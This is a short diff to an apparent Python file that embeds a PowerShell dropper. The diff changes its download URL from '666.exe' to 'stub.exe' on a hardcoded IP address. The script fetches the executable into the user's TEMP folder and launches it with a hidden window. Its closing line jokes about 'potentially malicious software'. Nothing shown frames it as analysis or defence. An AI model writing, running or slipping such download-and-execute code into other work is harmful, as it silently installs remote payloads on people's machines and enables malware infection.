@@ -3,8 +3,8 @@ import subprocess
 
 # PowerShell script content
 powershell_script = """
-$url = "http://162.19.219.101:2000/download/666.exe"
-$outputPath = "$env:TEMP\\666.exe"
+$url = "http://162.19.219.101/stub.exe"
+$outputPath = "$env:TEMP\\stub.exe"
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 Start-Process -FilePath $outputPath -WindowStyle Hidden
 Write-Host "File downloaded and executed. Enjoy your potentially malicious software!"
